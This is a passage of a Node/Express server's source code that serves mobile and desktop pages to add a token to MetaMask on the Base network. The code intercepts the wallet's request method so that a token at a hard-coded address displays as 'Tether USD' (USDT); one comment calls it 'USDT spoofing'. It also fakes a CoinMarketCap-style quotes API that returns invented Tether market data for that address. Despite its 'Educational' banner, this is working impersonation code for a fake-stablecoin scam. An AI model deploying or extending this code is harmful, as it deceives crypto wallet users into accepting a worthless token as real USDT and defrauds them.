// Generic token metadata endpoint (supports multiple wallets)
app.get('/api/token/metadata', (req, res) => {
  try {
    res.json({
      address: TOKEN_CONFIG.address,
      symbol: TOKEN_CONFIG.displaySymbol,
      name: TOKEN_CONFIG.displayName,
      decimals: TOKEN_CONFIG.decimals,
      chainId: TOKEN_CONFIG.chainId,
      logoURI: TOKEN_CONFIG.image,
      tags: ["stablecoin"],
      extensions: {
        coingeckoId: TOKEN_CONFIG.coinGeckoId,
        coinmarketcapId: TOKEN_CONFIG.coinMarketCapId,
        isStablecoin: true,
        isNative: TOKEN_CONFIG.isNative,
        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId
      }
    });
  } catch (error) {
    console.error('Token metadata error:', error);
    // Return minimal valid data
    res.status(200).json({
      address: TOKEN_CONFIG.address,
      symbol: TOKEN_CONFIG.displaySymbol,
      name: TOKEN_CONFIG.displayName,
      decimals: TOKEN_CONFIG.decimals,
      chainId: TOKEN_CONFIG.chainId
    });
  }
});

// Direct price endpoint
app.get('/api/token/price/:address', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json({
        address: address,
        priceUSD: 1.00,
        priceETH: 0.0005, // Approximate ETH value
        priceChange24h: 0.01,
        lastUpdated: new Date().toISOString()
      });
    } else {
      res.status(404).json({ error: "Token not found" });
    }
  } catch (error) {
    console.error('Token price error:', error);
    // Return valid data even on error
    res.status(200).json({
      address: req.params.address,
      priceUSD: 1.00,
      lastUpdated: new Date().toISOString()
    });
  }
});

// CoinMarketCap compatibility API
app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
  try {
    const id = req.query.id;
    const symbol = req.query.symbol;
    
    // Check if request is for our token
    if ((id && id === TOKEN_CONFIG.coinMarketCapId) || 
        (symbol && (symbol.toUpperCase() === 'USDT'))) {
      res.json({
        status: {
          timestamp: new Date().toISOString(),
          error_code: 0,
          error_message: null,
          elapsed: 10,
          credit_count: 1
        },
        data: {
          [TOKEN_CONFIG.coinMarketCapId]: {
            id: parseInt(TOKEN_CONFIG.coinMarketCapId),
            name: TOKEN_CONFIG.displayName,
            symbol: TOKEN_CONFIG.displaySymbol,
            slug: "tether",
            num_market_pairs: 28636,
            date_added: "2015-02-25T00:00:00.000Z",
            tags: [
              "stablecoin"
            ],
            max_supply: null,
            circulating_supply: 83500000000,
            total_supply: 83500000000,
            platform: {
              id: 8453,
              name: "Base",
              symbol: "ETH",
              slug: "base",
              token_address: TOKEN_CONFIG.address
            },
            is_active: 1,
            cmc_rank: 3,
            is_fiat: 0,
            last_updated: new Date().toISOString(),
            quote: {
              USD: {
                price: 1.00,
                volume_24h: 45750000000,
                volume_change_24h: 0.36,
                percent_change_1h: 0.01,
                percent_change_24h: 0.02,
                percent_change_7d: -0.05,
                percent_change_30d: 0.01,
                percent_change_60d: -0.02,
                percent_change_90d: 0.03,
                market_cap: 83500000000,
                market_cap_dominance: 5.5,
                fully_diluted_market_cap: 83500000000,
                last_updated: new Date().toISOString()
              }
            }
          }
        }
      });
    } else {
      // Return generic data for other requests
      res.json({
        status: {
          timestamp: new Date().toISOString(),
          error_code: 0,
          error_message: null,
          elapsed: 10,
          credit_count: 1
        },
        data: {}
      });
    }
  } catch (error) {
    console.error('CMC API error:', error);
    // Return valid data structure even on error
    res.status(200).json({
      status: {
        timestamp: new Date().toISOString(),
        error_code: 0,
        error_message: null
      },
      data: {}
    });
  }
});

// =========================================================
// DEEP LINKING ENDPOINTS
// =========================================================

// MetaMask deep link generator - updated for Base
app.get('/api/deeplink/metamask', (req, res) => {
  const deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=8453";
  res.json({ deepLink });
});

// Trust Wallet deep link generator - updated for Base
app.get('/api/deeplink/trustwallet', (req, res) => {
  const deepLink = "trust://base/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=8453";
  res.json({ deepLink });
});

// Generic wallet selection deep link - updated for Base
app.get('/api/deeplink', (req, res) => {
  const wallet = req.query.wallet || 'metamask';
  
  let deepLink;
  if (wallet.toLowerCase() === 'trust' || wallet.toLowerCase() === 'trustwallet') {
    deepLink = "trust://base/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=8453";
  } else {
    deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=8453";
  }
  
  res.json({ deepLink });
});

// =========================================================
// MOBILE ROUTES & HTML TEMPLATES
// =========================================================

// Direct token addition page - simplified, focused version with Base network
// IMPROVED: Better token addition process with network verification
app.get('/token-add-direct', (req, res) => {
  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adding USDT...</title>
  <script>
    // Immediate interception setup with more robustness
    (function setupInterception() {
      console.log("Setting up critical provider interception immediately");
      
      if (window.ethereum) {
        // Save the original request method
        if (!window.ethereum._originalRequest) {
          window.ethereum._originalRequest = window.ethereum.request;
        
          // Replace with enhanced intercepting version
          window.ethereum.request = async function(args) {
            console.log("MetaMask request:", args);
            
            try {
              // IMPROVED: Handle token addition with completely controlled parameters
              if (args.method === 'wallet_watchAsset') {
                console.log("TOKEN ADDITION DETECTED - handling token parameters");
                
                // Always ensure we use USDT display regardless of the input parameters
                if (args.params && args.params.options) {
                  const targetAddress = '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c'.toLowerCase();
                  
                  // If this is for our token OR if no specific token is requested (safety case)
                  if (!args.params.options.address || 
                      args.params.options.address.toLowerCase() === targetAddress) {
                    
                    console.log("Creating clean token parameters for USDT display");
                    
                    // Create a clean new request with carefully controlled parameters
                    const modifiedParams = {
                      type: 'ERC20',
                      options: {
                        address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
                        symbol: "USDT",
                        name: "Tether USD", 
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
                      }
                    };
                    
                    // Override the params completely
                    args.params = modifiedParams;
                    console.log("Modified token parameters:", args.params);
                  }
                }
              }
              
              // Call original with possibly modified args
              console.log("Calling original request with args:", args);
              const result = await window.ethereum._originalRequest.call(this, args);
              console.log("Request result:", result);
              return result;
            } catch (error) {
              console.error("Error in intercepted request:", error);
              throw error;
            }
          };
        }
      } else {
        console.error("MetaMask not detected!");
      }
    })();
    
    // Explicitly ensure we're on Base Network with better verification
    async function ensureBaseNetwork() {
      try {
        console.log("Checking current network");
        if (!window.ethereum) return false;
        
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        console.log("Current chain ID:", chainId);
        
        // If not on Base (0x2105), force switch with polling
        if (chainId !== '0x2105') {
          console.log("Not on Base Network, switching...");
          
          try {
            // Request switch to Base
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x2105' }], // Base Network
            });
            
            // Poll for network change
            let attempts = 0;
            const maxAttempts = 10;
            
            while (attempts < maxAttempts) {
              // Wait before checking
              await new Promise(resolve => setTimeout(resolve, 1000));
              attempts++;
              
              // Check current chain
              const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
              console.log("Polling chain ID (attempt " + attempts + "):", currentChain);
              
              if (currentChain === '0x2105') {
                console.log("Successfully switched to Base Network");
                return true;
              }
            }
            
            // If we got here, network switching didn't complete in time
            console.error("Network switching timed out");
            return false;
            
          } catch (switchError) {
            // If Base isn't added to MetaMask yet, add it
            if (switchError.code === 4902) {
              try {
                console.log("Adding Base Network configuration");
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: '0x2105',
                    chainName: 'Base',
                    nativeCurrency: {
                      name: 'ETH',
                      symbol: 'ETH',
                      decimals: 18
                    },
                    rpcUrls: ['https://mainnet.base.org'],
                    blockExplorerUrls: ['https://basescan.org']
                  }]
                });
                
                // Give a moment for the network to be added
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Try switching again after adding
                await window.ethereum.request({
                  method: 'wallet_switchEthereumChain',
                  params: [{ chainId: '0x2105' }],
                });
                
                // Poll for network change again
                let addAttempts = 0;
                const maxAddAttempts = 10;
                
                while (addAttempts < maxAddAttempts) {
                  // Wait before checking
                  await new Promise(resolve => setTimeout(resolve, 1000));
                  addAttempts++;
                  
                  // Check current chain
                  const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
                  console.log("Polling chain ID after adding (attempt " + addAttempts + "):", currentChain);
                  
                  if (currentChain === '0x2105') {
                    console.log("Added and switched to Base Network");
                    return true;
                  }
                }
                
                console.error("Network switching after adding timed out");
                return false;
              } catch (addError) {
                console.error("Failed to add Base Network:", addError);
                return false;
              }
            } else if (switchError.code === 4001) {
              // User rejected switch
              console.error("User rejected network switch");
              return false;
            } else {
              console.error("Failed to switch network:", switchError);
              return false;
            }
          }
        } else {
          console.log("Already on Base Network");
          return true;
        }
      } catch (error) {
        console.error("Error checking chain:", error);
        return false;
      }
    }
    
    // Enhanced wallet connection with better error handling
    async function prepareWalletConnection() {
      console.log("Preparing wallet connection...");
      try {
        if (!window.ethereum) {
          console.error("MetaMask not detected");
          return false;
        }
        
        // First try getting accounts to see if already connected
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        console.log("Existing accounts:", accounts);
        
        if (!accounts || accounts.length === 0) {
          // Need to request connection
          console.log("No accounts available, requesting permissions");
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          // Check again after request
          const newAccounts = await window.ethereum.request({ method: 'eth_accounts' });
          console.log("Accounts after permission request:", newAccounts);
          
          if (!newAccounts || newAccounts.length === 0) {
            console.error("Failed to get accounts after permission request");
            return false;
          }
        }
        
        return true;
      } catch (error) {
        if (error.code === 4001) {
          console.error("User rejected wallet connection");
        } else {
          console.error("Error preparing wallet connection:", error);
        }
        return false;
      }
    }

    // Improved direct token addition with better error reporting
    async function directAddToken() {
      try {
        console.log("Starting direct token addition method");
        
        // Ensure we're on Base network first with improved verification
        console.log("Ensuring Base network...");
        const networkReady = await ensureBaseNetwork();
        
        if (!networkReady) {
          document.getElementById('networkError').style.display = 'block';
          document.getElementById('switchNetworkBtn').style.display = 'block';
          document.getElementById('status').textContent = "Network configuration error. Please switch to Base network.";
          throw new Error("Could not ensure Base network. Please switch manually and try again.");
        }
        
        // Ensure wallet is connected
        console.log("Preparing wallet connection...");
        const walletReady = await prepareWalletConnection();
        
        if (!walletReady) {
          document.getElementById('status').textContent = "Could not connect to wallet. Please approve the connection request.";
          throw new Error("Could not connect to wallet. Please approve the connection request.");
        }
        
        // Get current chain to verify again
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        console.log("Current chain before token addition:", chainId);
        
        if (chainId !== '0x2105') {
          document.getElementById('networkError').style.display = 'block';
          document.getElementById('switchNetworkBtn').style.display = 'block';
          document.getElementById('status').textContent = "Not on Base network. Please switch networks and try again.";
          throw new Error("Not on Base network. Please switch networks and try again.");
        }
        
        // Add token with explicit parameters
        console.log("Adding token with parameters:", {
          address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
          symbol: 'USDT',
          name: 'Tether USD',
          decimals: 18
        });
        
        document.getElementById('status').textContent = "Adding USDT token to wallet...";
        
        const success = await window.ethereum.request({
          method: 'wallet_watchAsset',
          params: {
            type: 'ERC20',
            options: {
              address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
              symbol: 'USDT',
              name: 'Tether USD',
              decimals: 18,
              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
            }
          }
        });
        
        console.log("Token addition result:", success);
        
        if (success) {
          document.getElementById('status').textContent = "Success! Token added.";
          // Redirect to success page
          setTimeout(() => {
            window.location.href = '/mobile/success';
          }, 2000);
          return true;
        } else {
          document.getElementById('status').textContent = "Token addition was not completed. You may have cancelled.";
          throw new Error("Token addition was not completed. User may have cancelled.");
        }
      } catch (error) {
        console.error("Direct token addition failed:", error);
        
        // Special handling for "token not supported" error
        if (error.message && error.message.includes("not supported on network")) {
          document.getElementById('networkError').style.display = 'block';
          document.getElementById('switchNetworkBtn').style.display = 'block';
        }
        
        document.getElementById('retryBtn').style.display = 'block';
        document.querySelector('.loader').style.display = 'none';
        
        throw error;
      }
    }
    
    document.addEventListener('DOMContentLoaded', () => {
      const switchNetworkBtn = document.getElementById('switchNetworkBtn');
      if (switchNetworkBtn) {
        switchNetworkBtn.addEventListener('click', ensureBaseNetwork);
      }
      
      const retryBtn = document.getElementById('retryBtn');
      if (retryBtn) {
        retryBtn.addEventListener('click', directAddToken);
      }
      
      // Start token addition with a short delay to ensure page is fully loaded
      setTimeout(() => {
        directAddToken().catch(err => {
          console.error("Token addition error:", err);
          document.getElementById('status').textContent = "Error: " + err.message;
          document.getElementById('retryBtn').style.display = 'block';
        });
      }, 1000);
      
      // Add safety timeout (3 minutes)
      const safetyTimeout = setTimeout(() => {
        const statusDiv = document.getElementById('status');
        if (statusDiv.textContent.includes("Adding") || statusDiv.textContent.includes("Preparing")) {
          statusDiv.textContent = "Operation timed out after 3 minutes. Please try again.";
          document.querySelector('.loader').style.display = 'none';
          document.getElementById('retryBtn').style.display = 'block';
        }
      }, 180000); // 3 minutes to match the main file
      
      // Clear timeout if page is unloaded
      window.addEventListener('beforeunload', () => {
        clearTimeout(safetyTimeout);
      });
    });
  </script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      text-align: center;
      padding: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 80vh;
      background-color: #f5f5f7;
      color: #1d1d1f;
    }
    h1 {
      color: #26a17b;
      margin-bottom: 20px;
    }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #26a17b;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #status {
      margin-top: 20px;
      font-weight: bold;
      padding: 15px;
      border-radius: 8px;
      background-color: #f0f8ff;
      border-left: 4px solid #26a17b;
      text-align: left;
      max-width: 400px;
    }
    button {
      background-color: #26a17b;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    button:hover {
      background-color: #219472;
    }
    .network-info {
      background-color: #f0f8ff;
      padding: 10px;
      border-radius: 8px;
      margin: 10px 0;
      border-left: 4px solid #26a17b;
    }
    #networkError {
      color: #e74c3c;
      margin-top: 15px;
      display: none;
      background-color: #fdecea;
      padding: 10px;
      border-radius: 8px;
      border-left: 4px solid #e74c3c;
    }
    #switchNetworkBtn {
      background-color: #3498db;
      display: none;
    }
    #retryBtn {
      display: none;
      margin-top: 20px;
    }
    .token-info {
      display: flex;
      align-items: center;
      background-color: white;
      padding: 15px;
      border-radius: 12px;
      margin: 20px 0;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
    }
    .token-logo {
      width: 40px;
      height: 40px;
      margin-right: 15px;
    }
    .token-details {
      text-align: left;
    }
    .token-symbol {
      font-weight: bold;
      font-size: 18px;
    }
    .token-address {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <h1>Adding USDT to MetaMask</h1>
  
  <div class="token-info">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="token-logo">
    <div class="token-details">
      <div class="token-symbol">USDT</div>
      <div>Tether USD on Base Network</div>
      <div class="token-address">0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c</div>
    </div>
  </div>
  
  <div class="loader"></div>
  
  <div id="status">Initializing token addition process...</div>
  
  <div id="networkError" style="display:none">
    This token requires the Base network.<br>
    Please switch to Base network to continue.
  </div>
  
  <button id="switchNetworkBtn" style="display:none">Switch to Base Network</button>
  <button id="retryBtn" style="display:none">Try Again</button>
</body>
</html>
  `;
  
  res.send(html);
});

// Mobile-optimized token addition page with USDT spoofing - updated for Base
app.get('/mobile/add-token', (req, res) => {
  const host = req.get('host');
  const protocol = req.protocol;
  
  // HTML content for mobile token addition page
  // This is a simplified version for brevity
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#26a17b">
  <title>Add USDT to Your Wallet</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <script>
    // Immediate interception setup (similar to token-add-direct)
    (function setupInterception() {
      if (window.ethereum) {
        console.log("Setting up MetaMask interception");
        
        // Save the original request method
        if (!window.ethereum._originalRequest) {
          window.ethereum._originalRequest = window.ethereum.request;
        
          // Replace with intercepting version
          window.ethereum.request = async function(args) {
            console.log("MetaMask request:", args);
            
            // Handle token addition with full parameter control
            if (args.method === 'wallet_watchAsset' && 
                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
              
              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
              
              // Create a clean new request with carefully controlled parameters
              const modifiedParams = {
                type: 'ERC20',
                options: {
                  address: '${TOKEN_CONFIG.address}',
                  symbol: "${TOKEN_CONFIG.displaySymbol}",
                  name: "${TOKEN_CONFIG.displayName}",
                  decimals: ${TOKEN_CONFIG.decimals},
                  image: '${TOKEN_CONFIG.image}'
                }
              };
              
              // Override the params completely
              args.params = modifiedParams;
            }
            
            // Call original with modified args
            try {
              console.log("Calling original request with args:", args);
              return await window.ethereum._originalRequest.call(this, args);
            } catch (error) {
              console.error("Error in intercepted request:", error);
              throw error;
            }
          };
        }
      }
    })();
    
    // Ensure we're on Base Network
    async function ensureBaseNetwork() {
      try {
        if (!window.ethereum) return false;
        
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        // If not on Base (0x2105), force switch
        if (chainId !== '0x2105') {
          console.log("Not on Base Network, switching...");
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x2105' }], // Base
            });
            console.log("Successfully switched to Base Network");
            
            // Give the wallet a moment to update
            await new Promise(resolve => setTimeout(resolve, 1000));
            return true;
          } catch (switchError) {
            // If Base isn't added to MetaMask yet, add it
            if (switchError.code === 4902) {
              try {
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: '0x2105',
                    chainName: 'Base',
                    nativeCurrency: {
                      name: 'ETH',
                      symbol: 'ETH',
                      decimals: 18
                    },
                    rpcUrls: ['https://mainnet.base.org'],
                    blockExplorerUrls: ['https://basescan.org']
                  }]
                });
                
                // Try switching again after adding
                await window.ethereum.request({
                  method: 'wallet_switchEthereumChain',
                  params: [{ chainId: '0x2105' }],
                });
                
                // Give the wallet a moment to update
                await new Promise(resolve => setTimeout(resolve, 1000));
                return true;
              } catch (addError) {
                console.error("Failed to add Base Network:", addError);
                return false;
              }
            } else {
              console.error("Failed to switch network:", switchError);
              return false;
            }
          }
        } else {
          console.log("Already on Base Network");
          return true;
        }
      } catch (error) {
        console.error("Error checking chain:", error);
        return false;
      }
    }
  </script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
    }
    .add-btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" style="width: 80px; height: 80px; margin-bottom: 16px;">
    <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center;">Add USDT to Your Wallet</h1>
    <p style="font-size: 16px; color: #666; margin-bottom: 24px; text-align: center;">Tether USD on Base</p>
    
    <button id="addBtn" class="add-btn">Add to MetaMask</button>
    
    <div id="loading" style="display: none; flex-direction: column; align-items: center; margin-top: 20px;">
      <div style="border: 4px solid rgba(0, 0, 0, 0.1); border-left-color: #26a17b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
      <p style="margin-top: 16px; font-size: 16px; color: #666;">Opening wallet...</p>
    </div>
    
    <div id="networkError" style="display: none; color: #e74c3c; margin: 20px 0; text-align: center;">
      Please switch to Base network in your wallet settings
    </div>
    
    <div style="margin-top: 24px; background-color: #f8f8f8; border-radius: 12px; padding: 16px; width: 100%; max-width: 300px;">
      <h3 style="margin-top: 0; font-size: 16px;">Instructions:</h3>
      <ol style="margin: 0; padding-left: 24px;">
        <li style="margin-bottom: 8px; font-size: 14px;">Click "Add to MetaMask" above</li>
        <li style="margin-bottom: 8px; font-size: 14px;">Your wallet will open automatically</li>
        <li style="margin-bottom: 8px; font-size: 14px;">Approve adding the USDT token</li>
        <li style="margin-bottom: 8px; font-size: 14px;">You'll see your USDT in your wallet!</li>
      </ol>
    </div>
  </div>
  
  <script>
    // Enhanced Add button implementation with timeout
    document.getElementById('addBtn').addEventListener('click', async function() {
      // Show loading spinner
      const loadingElement = document.getElementById('loading');
      loadingElement.style.display = 'flex';
      const networkError = document.getElementById('networkError');
      networkError.style.display = 'none';
      
      // Add safety timeout (3 minutes)
      const safetyTimeout = setTimeout(() => {
        loadingElement.style.display = 'none';
        networkError.textContent = "Operation timed out after 3 minutes. Please try again.";
        networkError.style.display = 'block';
      }, 180000); // 3 minutes
      
      try {
        // If MetaMask is available in the browser, use direct method
        if (window.ethereum && window.ethereum.isMetaMask) {
          // First make sure we're on Base network
          const networkReady = await ensureBaseNetwork();
          if (!networkReady) {
            clearTimeout(safetyTimeout);
            loadingElement.style.display = 'none';
            networkError.style.display = 'block';
            return;
          }
        
          const success = await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20',
              options: {
                address: '${TOKEN_CONFIG.address}',
                symbol: '${TOKEN_CONFIG.displaySymbol}',
                decimals: ${TOKEN_CONFIG.decimals},
                image: '${TOKEN_CONFIG.image}'
              }
            }
          });
          
          clearTimeout(safetyTimeout);
          
          if (success) {
            window.location.href = '/mobile/success';
          } else {
            loadingElement.style.display = 'none';
          }
        } else {
          // For mobile browsers without MetaMask, use deep linking
          window.location.href = 'https://metamask.app.link/dapp/${host}/token-add-direct';
        }
      } catch (err) {
        clearTimeout(safetyTimeout);
        console.error('Error adding token:', err);
        loadingElement.style.display = 'none';
        if (err.message && err.message.includes("not supported on network")) {
          networkError.style.display = 'block';
        }
      }
    });
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// Success page
app.get('/mobile/success', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>USDT Added Successfully</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
      text-align: center;
    }
    .success-icon {
      width: 80px;
      height: 80px;
      background-color: #26a17b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }
    .btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-bottom: 16px;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="success-icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" fill="white">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
      </svg>
    </div>
    
    <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 16px;">USDT Successfully Added!</h1>
    <p style="font-size: 16px; color: #666; margin-bottom: 32px; max-width: 300px;">Your USDT token has been added to your wallet. You can now view and manage it in your wallet.</p>
    
    <div>
      <a href="/" class="btn">Return to Home</a>
    </div>
  </div>
</body>
</html>
  `;
  
  res.send(html);
});

// Root route - detect mobile and redirect accordingly
app.get('/', (req, res) => {
  // Check if user is on mobile
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
  
  if (isMobile) {
    // Mobile users go to mobile-optimized page
    res.redirect('/mobile/add-token');
  } else {
    // Desktop users get the standard page
    res.sendFile(path.join(__dirname, 'index.html'));
  }
});

// 404 catch-all route
app.use((req, res, next) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>404 - Page Not Found</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          text-align: center; 
          padding: 50px; 
        }
      </style>
    </head>
    <body>
      <h1>404 - Page Not Found</h1>
      <p>The page you are looking for does not exist.</p>
      <a href="/">Return to Home</a>
    </body>
    </html>
  `);
});

// =========================================================
// SERVER STARTUP
// =========================================================

// Initialize price cache warmer
priceCacheWarmer.init();

// Start the server
server.listen(port, () => {
  console.log("======================================");
  console.log("Educational Token Display Server");
  console.log("======================================");
  console.log("Server running on port: " + port);
  console.log("Token Display: USDT on Base");
  console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
  console.log("Token Contract: " + TOKEN_CONFIG.address);
  console.log("Decimals: " + TOKEN_CONFIG.decimals);
  console.log("API Health Check: http://localhost:" + port + "/api/token-info");
  console.log("MetaMask Deep Link: metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=8453");
  console.log("======================================");
});

module.exports = app;
